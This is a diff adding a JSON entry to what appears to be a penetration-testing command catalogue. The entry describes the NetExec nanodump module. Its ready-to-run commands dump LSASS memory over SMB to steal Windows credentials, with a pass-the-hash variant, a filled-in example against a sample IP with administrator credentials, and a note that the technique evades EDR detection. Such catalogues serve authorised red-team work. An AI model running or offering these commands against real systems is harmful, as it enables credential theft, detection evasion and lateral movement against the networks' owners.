@@ -1,0 +1,19 @@
+{
+  "id": "nxc-nanodump",
+  "name": "NetExec nanodump Module",
+  "command": "nxc smb <target> -u '<user>' -p '<password>' -M nanodump",
+  "description": "Dump LSASS using the nanodump BOF/PE technique — minimal dump, fewer EDR signatures than full minidumps, parsed locally with pypykatz. Requires local admin.",
+  "platform": "linux",
+  "requires": ["password"],
+  "protocols": ["smb"],
+  "tags": ["netexec", "nxc", "nanodump", "lsass", "evasion"],
+  "variations": [
+    { "label": "Hash Auth", "requires": "hash", "command": "nxc smb <target> -u '<user>' -H '<hash>' -M nanodump" }
+  ],
+  "references": [
+    { "title": "nanodump", "url": "https://github.com/fortra/nanodump" }
+  ],
+  "examples": [
+    "nxc smb 10.10.10.10 -u administrator -p 'Password123!' -M nanodump"
+  ]
+}
